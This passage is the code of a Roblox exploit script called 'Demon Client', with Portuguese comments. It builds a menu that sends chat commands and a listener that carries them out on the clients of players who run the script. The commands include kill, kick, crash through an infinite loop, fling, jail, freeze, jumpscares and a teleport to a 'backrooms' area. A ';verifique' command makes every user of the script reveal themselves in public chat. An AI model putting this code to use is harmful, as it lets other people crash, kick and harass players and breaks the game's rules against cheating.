                    TeleportToBackrooms(player)
                end
            end
            WindUI:Notify("BACKROOMS", "🚪 Enviando " .. #selectedPlayers .. " jogador(es) para as Backrooms! CUIDADO COM O MONSTRO! 💀")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

local UnbackroomsButton = BasicSection:Button({
    Title = "Unbackrooms cmd",
    Icon = "home",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local player = Players:FindFirstChild(playerName)
                if player then
                    RestoreNormalWorld()
                end
            end
            WindUI:Notify("BACKROOMS", "🏠 Retornando " .. #selectedPlayers .. " jogador(es) do Backrooms!")
        else
            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
        end
    end
})

-- Seção Jumpscares
local JumpscareSection = ComandosTab:Section({
    Title = "Sistema de Jumpscares",
    Desc = "Sustos e efeitos assustadores"
})

-- Botões dos Jumpscares
for _, jumpscare in ipairs(JUMPSCARES) do
    local JumpscareButton = JumpscareSection:Button({
        Title = jumpscare.Name,
        Icon = "alert-triangle",
        Callback = function()
            if #selectedPlayers > 0 then
                for _, playerName in ipairs(selectedPlayers) do
                    local mensagem = jumpscare.Name .. " " .. playerName
                    SendCommand(mensagem)
                end
                WindUI:Notify("Jumpscare", jumpscare.Name .. " enviado para " .. #selectedPlayers .. " jogador(es)!")
            else
                WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
            end
        end
    })
end

-- Seção Tags
local TagsSection = ComandosTab:Section({
    Title = "Sistema de Tags",
    Desc = "Controle de tags dos jogadores"
})

local TagAllButton = TagsSection:Button({
    Title = "Ativar Todas Tags",
    Icon = "eye",
    Callback = function()
        SendCommand(";tag all")
        WindUI:Notify("Tags", "🏷️ Todas as tags foram ativadas!")
        for _, player in ipairs(Players:GetPlayers()) do
            applyTag(player)
        end
    end
})

local UntagAllButton = TagsSection:Button({
    Title = "Remover Todas Tags",
    Icon = "eye-off",
    Callback = function()
        SendCommand(";untag all")
        WindUI:Notify("Tags", "🚫 Todas as tags foram removidas!")
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                local tag = head:FindFirstChild("SpecialTag")
                if tag then
                    tag:Destroy()
                end
            end
        end
    end
})

local TagMeButton = TagsSection:Button({
    Title = "Ativar Minha Tag",
    Icon = "user",
    Callback = function()
        SendCommand(";tag")
        WindUI:Notify("Tags", "👤 Sua tag foi ativada!")
        applyTag(LocalPlayer)
    end
})

local UntagMeButton = TagsSection:Button({
    Title = "Remover Minha Tag",
    Icon = "user-x",
    Callback = function()
        SendCommand(";untag")
        WindUI:Notify("Tags", "🙈 Sua tag foi removida!")
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
            local head = LocalPlayer.Character.Head
            local tag = head:FindFirstChild("SpecialTag")
            if tag then
                tag:Destroy()
            end
        end
    end
})

-- ===== SISTEMA DE COMANDOS =====
local function ProcessarComando(mensagem)
    if string.sub(mensagem, 1, 1) == ";" then
        local partes = string.split(string.sub(mensagem, 2), " ")
        local comando = partes[1]:lower()
        local nomeAlvo = table.concat(partes, " ", 2)
        
        -- Verifica se o comando é para ESTE jogador
        local isSelfTarget = nomeAlvo and (nomeAlvo:lower() == LocalPlayer.Name:lower() or nomeAlvo:lower() == LocalPlayer.DisplayName:lower())
        local playerName = LocalPlayer.Name
        local character = LocalPlayer.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        
        if isSelfTarget then
            print("🎯 Comando recebido: " .. comando .. " para " .. LocalPlayer.Name)
            
            -- Comandos de Tags
            if comando == "untag" then
                if character and character:FindFirstChild("Head") then
                    local head = character.Head
                    local tag = head:FindFirstChild("SpecialTag")
                    if tag then
                        tag:Destroy()
                    end
                end
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "[DemonClient] Tags removidas para " .. LocalPlayer.Name,
                    Color = Color3.fromRGB(170, 0, 255),
                    Font = Enum.Font.GothamBold
                })
                return
            end

            if comando == "tag" then
                applyTag(LocalPlayer)
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "[DemonClient] Tags restauradas para " .. LocalPlayer.Name,
                    Color = Color3.fromRGB(170, 0, 255),
                    Font = Enum.Font.GothamBold
                })
                return
            end

            -- Kill Plus
            if comando == "killplus" then
                KillPlus(LocalPlayer)
                return
            end

            -- Backrooms
            if comando == "backrooms" then
                TeleportToBackrooms(LocalPlayer)
                return
            end

            -- Unbackrooms
            if comando == "unbackrooms" then
                RestoreNormalWorld()
                return
            end

            -- Freeze  
            if comando == "freeze" then  
                if humanoid then  
                    playerOriginalSpeed[playerName] = humanoid.WalkSpeed  
                    humanoid.WalkSpeed = 0  
                    print("❄️ FREEZE executado em " .. LocalPlayer.Name)
                end  
                return  
            end  

            -- Unfreeze  
            if comando == "unfreeze" then  
                if humanoid then  
                    humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16  
                    playerOriginalSpeed[playerName] = nil  
                    print("🔥 UNFREEZE executado em " .. LocalPlayer.Name)
                end  
                return  
            end  

            -- Jail  
            if comando == "jail" then  
                if character then  
                    local root = character:FindFirstChild("HumanoidRootPart")  
                    local humanoid = character:FindFirstChildOfClass("Humanoid")  
                    if root and humanoid then  
                        playerOriginalSpeed[playerName] = humanoid.WalkSpeed  
                        humanoid.WalkSpeed = 0  

                        local size = 12
                        local pos = root.Position  
                        jaulas[playerName] = {}  
                        
                        -- Função para criar barras elegantes PRETO E BRANCO
                        local function criarBarra(cframe, size, color)
                            local p = Instance.new("Part")
                            p.Name = "DemonClientJailBar"
                            p.Size = size
                            p.Anchored = true
                            p.CanCollide = true
                            p.Material = Enum.Material.Neon
                            p.BrickColor = color
                            p.Reflectance = 0.2
                            p.CFrame = cframe
                            p.Parent = workspace
                            
                            local pointLight = Instance.new("PointLight")
                            pointLight.Brightness = 3
                            pointLight.Range = 8
                            pointLight.Color = color == BrickColor.new("Really black") and Color3.new(0, 0, 0) or Color3.new(1, 1, 1)
                            pointLight.Parent = p
                            
                            table.insert(jaulas[playerName], p)
                            return p
                        end

                        -- BARRAS VERTICAIS PRETAS (Cantos)
                        criarBarra(CFrame.new(pos + Vector3.new(size/2, 0, size/2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"))
                        criarBarra(CFrame.new(pos + Vector3.new(-size/2, 0, size/2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"))
                        criarBarra(CFrame.new(pos + Vector3.new(size/2, 0, -size/2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"))
                        criarBarra(CFrame.new(pos + Vector3.new(-size/2, 0, -size/2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"))

                        -- BARRAS HORIZONTAIS SUPERIORES BRANCAS
                        criarBarra(CFrame.new(pos + Vector3.new(0, size/2, size/2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(0, size/2, -size/2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(size/2, size/2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(-size/2, size/2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"))

                        -- BARRAS HORIZONTAIS INFERIORES BRANCAS
                        criarBarra(CFrame.new(pos + Vector3.new(0, -size/2, size/2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(0, -size/2, -size/2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(size/2, -size/2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(-size/2, -size/2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"))

                        if jailConnections[playerName] then  
                            jailConnections[playerName]:Disconnect()  
                        end  
                          
                        jailConnections[playerName] = RunService.Heartbeat:Connect(function()  
                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then  
                                local hrp = LocalPlayer.Character.HumanoidRootPart  
                                local center = pos + Vector3.new(0, 0, 0)  
                                if (hrp.Position - center).Magnitude > size/2 - 1 then  
                                    hrp.CFrame = CFrame.new(center)  
                                end  
                            end  
                        end)  

                        print("⚫ JAIL PRETO E BRANCO executado em " .. LocalPlayer.Name)
                    end  
                end  
                return  
            end  

            -- Unjail  
            if comando == "unjail" then  
                if character then  
                    local humanoid = character:FindFirstChildOfClass("Humanoid")  
                    if humanoid then  
                        humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16  
                        playerOriginalSpeed[playerName] = nil  
                    end  

                    if jaulas[playerName] then  
                        for _, p in ipairs(jaulas[playerName]) do  
                            if p and p.Parent then  
                                p:Destroy()  
                            end  
                        end  
                        jaulas[playerName] = nil  
                        print("✅ Quadrado 3D do Jail removido do mapa!")
                    end  

                    if jailConnections[playerName] then  
                        jailConnections[playerName]:Disconnect()  
                        jailConnections[playerName] = nil  
                    end  
                    print("⚪ UNJAIL executado em " .. LocalPlayer.Name)
                end  
                return  
            end

            -- Sistema de Jumpscares
            if comando == "jumps1" then
                TriggerJumpscare(LocalPlayer, JUMPSCARES[1])
                print("💀 JUMPS CARE 1 ativado em " .. LocalPlayer.Name)
            elseif comando == "jumps2" then
                TriggerJumpscare(LocalPlayer, JUMPSCARES[2])
                print("💀 JUMPS CARE 2 ativado em " .. LocalPlayer.Name)
            elseif comando == "jumps3" then
                TriggerJumpscare(LocalPlayer, JUMPSCARES[3])
                print("💀 JUMPS CARE 3 ativado em " .. LocalPlayer.Name)
            elseif comando == "jumps4" then
                TriggerJumpscare(LocalPlayer, JUMPSCARES[4])
                print("💀 JUMPS CARE 4 ativado em " .. LocalPlayer.Name)
            
            -- Comandos anteriores
            elseif comando == "kill" and character then
                character:BreakJoints()
                print("💀 KILL executado em " .. LocalPlayer.Name)
            elseif comando == "kick" then
                LocalPlayer:Kick("🚫 Você foi kickado - equipe: Demon")
                print("👢 KICK executado em " .. LocalPlayer.Name)
            elseif comando == "crash" then
                print("💥 CRASH executado em " .. LocalPlayer.Name)
                while true do end
            elseif comando == "explodir" and character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart then
                    local explosion = Instance.new("Part")
                    explosion.Name = "DemonClientExplosion"
                    explosion.Size = Vector3.new(8, 8, 8)
                    explosion.Shape = Enum.PartType.Ball
                    explosion.Material = Enum.Material.Neon
                    explosion.BrickColor = BrickColor.new("Institutional white")
                    explosion.Position = humanoidRootPart.Position
                    explosion.Anchored = true
                    explosion.CanCollide = false
                    explosion.Parent = workspace
                    
                    local pointLight = Instance.new("PointLight")
                    pointLight.Brightness = 10
                    pointLight.Range = 15
                    pointLight.Color = Color3.new(1, 1, 1)
                    pointLight.Parent = explosion
                    
                    character:BreakJoints()
                    
                    for _, part in pairs(character:GetDescendants()) do
                        if part:IsA("BasePart") and part ~= humanoidRootPart then
                            part.Velocity = Vector3.new(
                                math.random(-50, 50),
                                math.random(30, 60), 
                                math.random(-50, 50)
                            )
                        end
                    end
                    
                    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                    local tween = TweenService:Create(explosion, tweenInfo, {Size = Vector3.new(20, 20, 20)})
                    tween:Play()
                    
                    game:GetService("Debris"):AddItem(explosion, 2)
                    
                    print("💥 EXPLOSÃO BRANCA executada em " .. LocalPlayer.Name)
                end
            elseif comando == "fling" and character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart then
                    print("🚀 INICIANDO FLING ÉPICO EM " .. LocalPlayer.Name)
                    
                    local flash = Instance.new("Part")
                    flash.Name = "DemonClientFlingFlash"
                    flash.Size = Vector3.new(15, 15, 15)
                    flash.Shape = Enum.PartType.Ball
                    flash.Material = Enum.Material.Neon
                    flash.BrickColor = BrickColor.new("Bright blue")
                    flash.Position = humanoidRootPart.Position
                    flash.Anchored = true
                    flash.CanCollide = false
                    flash.Parent = workspace
                    
                    local flashLight = Instance.new("PointLight")
                    flashLight.Brightness = 15
                    flashLight.Range = 20
                    flashLight.Color = Color3.new(0, 0, 1)
                    flashLight.Parent = flash
                    
                    wait(0.5)
                    
                    humanoidRootPart.Velocity = Vector3.new(
                        math.random(-999999, 999999),
                        math.random(500000, 999999),
                        math.random(-999999, 999999)
                    )
                    
                    game:GetService("Debris"):AddItem(flash, 1)
                    
                    print("🌌 FLING ÉPICO EXECUTADO! Qualidade da tela: 💀")
                    print("🎯 " .. LocalPlayer.Name .. " foi pro infinito e além!")
                end
            elseif comando == "bring" and character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart then
                    print("🎯 BRING recebido! Procurando quem enviou...")
                    
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                local senderRootPart = player.Character.HumanoidRootPart
                                
                                local bringEffect = Instance.new("Part")
                                bringEffect.Name = "DemonClientBringEffect"
                                bringEffect.Size = Vector3.new(6, 6, 6)
                                bringEffect.Shape = Enum.PartType.Ball
                                bringEffect.Material = Enum.Material.Neon
                                bringEffect.BrickColor = BrickColor.new("Bright green")
                                bringEffect.Position = humanoidRootPart.Position
                                bringEffect.Anchored = true
                                bringEffect.CanCollide = false
                                bringEffect.Parent = workspace
                                
                                local bringLight = Instance.new("PointLight")
                                bringLight.Brightness = 8
                                bringLight.Range = 15
                                bringLight.Color = Color3.new(0, 1, 0)
                                bringLight.Parent = bringEffect
                                
                                local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                                local tween = TweenService:Create(bringEffect, tweenInfo, {Size = Vector3.new(12, 12, 12), Transparency = 0.8})
                                tween:Play()
                                
                                local targetPosition = senderRootPart.Position + senderRootPart.CFrame.LookVector * 5
                                humanoidRootPart.Position = targetPosition + Vector3.new(0, 3, 0)
                                
                                game:GetService("Debris"):AddItem(bringEffect, 1)
                                
                                print("✅ BRING executado! Teletransportado para " .. player.Name)
                                break
                            end
                        end
                    end
                end
            end
        end
        
        -- Comandos de Tags Globais
        if comando == "untag" and nomeAlvo == "all" then
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "[DemonClient] Todas as tags foram removidas.",
                Color = Color3.fromRGB(170, 0, 255),
                Font = Enum.Font.GothamBold
            })
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local tag = head:FindFirstChild("SpecialTag")
                    if tag then
                        tag:Destroy()
                    end
                end
            end
            return
        end

        if comando == "tag" and nomeAlvo == "all" then
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "[DemonClient] Todas as tags foram restauradas.",
                Color = Color3.fromRGB(170, 0, 255),
                Font = Enum.Font.GothamBold
            })
            for _, player in ipairs(Players:GetPlayers()) do
                applyTag(player)
            end
            return
        end
        
        -- ⚡ DETECTA ;verifique E EXECUTA EM TODOS (INCLUINDO VOCÊ) ⚡
        if comando == "verifique" then
            print("🎯 Verificação detectada! Digitando Demon_Users")
            
            wait(2)
            
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local canal = TextChatService.TextChannels.RBXGeneral
                if canal then
                    canal:SendAsync("Demon_Users")
                    print("✅ Demon_Users enviado por: " .. LocalPlayer.Name)
                end
            else
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Demon_Users", "All")
                print("✅ Demon_Users enviado por: " .. LocalPlayer.Name)
            end
        end
    end
end

-- Conectar ao chat para RECEBER comandos
task.spawn(function()
    wait(3)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if canal then
        canal.OnIncomingMessage = function(mensagem)
            ProcessarComando(mensagem.Text)
        end
        print("✅ Sistema de comandos ativo!")
    end
end)

-- ===== INICIALIZAR =====
WindUI:Notify("Lcc Client", "Sistema carregado com sucesso! ✅")
print("🎮 DEMON CLIENT - SISTEMA FUNCIONANDO!")
print("👑 Desenvolvido por: Lucas")
print("📊 ABAS ORGANIZADAS:")
print("   🛡️  Verify - Sistema de verificação")
print("   ⚡ Comandos - Todos os comandos disponíveis")
print("🎨 TEMA ROXO APLICADO!")
print("🛡️  SISTEMA DE WHITELIST ATIVADO - USUÁRIO AUTORIZADO!")
print("💀 KILL PLUS CORRIGIDO E FUNCIONAL!")
print("🏷️  SISTEMA DE TAGS CORRIGIDO!")
print("🚪 SISTEMA BACKROOMS ATUALIZADO!")
